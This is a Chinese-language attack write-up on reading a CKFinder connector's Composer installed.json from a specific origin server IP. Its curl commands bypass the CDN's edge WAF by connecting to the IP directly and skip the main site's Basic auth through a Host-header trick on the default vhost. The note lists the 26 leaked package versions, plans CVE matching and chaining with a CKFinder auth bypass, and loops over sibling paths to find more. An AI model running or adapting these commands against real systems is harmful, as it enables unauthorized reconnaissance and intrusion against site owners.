# 源站默认 vhost 匿名读取 CKFinder connector 的 Composer installed.json

## 前置
- 直连源站 IP:443（CDN 源站，直连绕边缘 WAF）；本机有代理时 `--noproxy '*'`
- `curl -k`（证书不匹配）、`--http1.0`（旧 Apache vhost）
- `Host` 设为任意非业务值（如 `localhost`），命中默认 vhost 并绕过主站 `/` 的 Basic 门禁
- 已知 CKFinder 集成前缀（本例 `/plugins/ckfinder/core/connector/php/`，与 connector.php 同目录）

## 复现
```bash
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' -A "$ARTEX_UA" \
  'https://3.8.196.174/plugins/ckfinder/core/connector/php/vendor/composer/installed.json' \
  -o installed.json -D - -w '\n%{http_code} %{size_download} %{content_type}\n'
```

命中回显（2026-11-11 18:46:13 GMT 复核）：
```
HTTP/1.1 200 OK
Server: Apache
X-Content-Type-Options: nosniff
Last-Modified: Fri, 06 Nov 2026 10:55:27 GMT
ETag: "c328-65f99732da333"
Content-Length: 49960
Content-Type: application/json
```

正文为 Composer 1 格式 JSON 数组（`json.load()` 后 len=26），每元素结构：
```json
{"name":"cksource/ckfinder","version":"dev-master","version_normalized":"dev-master",
 "source":{"type":"git","url":"https://github.com/cksource/ckfinder.git","reference":"db00f439fcb2..."},
 "require":{...},"time":"..."}
```

## 对照判据（三发）
```bash
# 1) 随机不存在路径 → 应用 404 页（排除整站兜底 200）
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' \
  https://3.8.196.174/zzq-nonexist-$RANDOM.html -o /dev/null -w '%{http_code} %{size_download}\n'
# → 404 1883

# 2) 根 composer.json → 名称型规则 403
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' \
  https://3.8.196.174/composer.json -o /dev/null -w '%{http_code} %{size_download}\n'
# → 403 215  (Content-Type: text/html; charset=iso-8859-1)

# 3) 根 vendor/composer/installed.json → 404（根目录没有 vendor）
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' \
  https://3.8.196.174/vendor/composer/installed.json -o /dev/null -w '%{http_code}\n'
# → 404
```
三条合起来 ⇒ installed.json 真实存在、被 Apache 当静态文件投递，且属名称保护名单遗漏（composer.json/.lock 保护了，installed.json 没保护）。

## 泄露的 26 个包（原样解析）
```
ralouphie/getallheaders                2.0.5        5601c8a83fbb
psr/http-message                       dev-master   f6561bf28d52
guzzlehttp/psr7                        dev-master   58f6e264ef0e
guzzlehttp/promises                    dev-master   136531aa4e42
guzzlehttp/guzzle                      dev-master   7bc46be28e4b
spatie/dropbox-api                     1.6.5        af8d429a5142
league/flysystem                       1.0.45        a99f94e63b51
spatie/flysystem-dropbox                1.0.6        cff7dba92528
microsoft/azure-storage                dev-master   e1702ae9e619
league/flysystem-azure                 dev-master   b61bdb369ad6
psr/cache                              dev-master   78c5a01ddbf1
league/flysystem-cached-adapter         1.0.6        93eec679c57f
mtdowling/jmespath.php                 2.4.0        adcc9531682c
aws/aws-sdk-php                        3.62.9       c4bca5798cad
psr/log                                dev-master   3490ba5925e6
league/flysystem-aws-s3-v3             1.0.13       dc56a8faf3af
monolog/monolog                        1.x-dev      c465e1144536
psr/container                          dev-master   2cc4a0178819
pimple/pimple                          dev-master   21e3e0dc8918
symfony/polyfill-mbstring              dev-master   25b83a5050c6
symfony/http-foundation                2.7.x-dev    c47d54254ee3
symfony/event-dispatcher               2.7.x-dev    04dc8ab78c0a
symfony/debug                          2.8.x-dev    a26ddce7fe4e
symfony/polyfill-ctype                 dev-master   9d31bef82d2e
symfony/http-kernel                    2.7.x-dev    16863f855382
cksource/ckfinder                      dev-master   db00f439fcb2
```

## 利用方向
1. **版本 → CVE 匹配**：symfony 2.7.x-dev / 2.8.x-dev 属 2018 年前已终止维护分支，对照 NVD 上的 symfony/http-foundation、http-kernel、debug 历史 CVE；`league/flysystem 1.0.45`、`aws/aws-sdk-php 3.62.9`、`spatie/dropbox-api 1.6.5` 均为可查版本号。
2. **dev-master → commit 还原**：dev-master 无版本号，按 `source.reference`（如 cksource/ckfinder db00f439fcb2）+ 上游 GitHub 历史可定位实际代码快照，再比对修复 commit。
3. **组件确权**：确认目标跑的是 CKFinder 3.x PHP connector 且 vendor 目录可直接触达，可与 CKFinder connector 认证绕过（匿名 DownloadFile / ImagePreview）组合评估。

## 铺面（找同族遗漏）
```bash
# 对已知 connector 目录族逐个试 installed.json
for p in /plugins/ckfinder/core/connector/php /ckfinder/core/connector/php /admin/ckfinder/core/connector/php; do
  curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' \
    "https://3.8.196.174$p/vendor/composer/installed.json" -o /dev/null \
    -w "$p %{http_code} %{size_download}\n"
done
```
同类可直接读的还有 `vendor/composer/installed.php`（Composer 2）、`vendor/composer/autoload_static.php`（含全部类名与包路径映射）。

## 常见失败原因
- 走 CDN 域名而非源站 IP ⇒ 边缘 403/404 或返回缓存页；
- Host 设真实业务域名 ⇒ 落到主站 vhost，命中 Basic 门禁；
- connector 路径猜错（集成方式不同）⇒ 落到应用 404 页（1883B）；
- 目标已补 .htaccess 名称规则或升级 Composer 2 ⇒ 403/404 或顶层变对象 `{"packages":[...]}`，需换解析。

## 证伪条件
该 URL 返回 403/404，或正文不含 `name`/`version`/`source.reference` ⇒ 本结论不成立。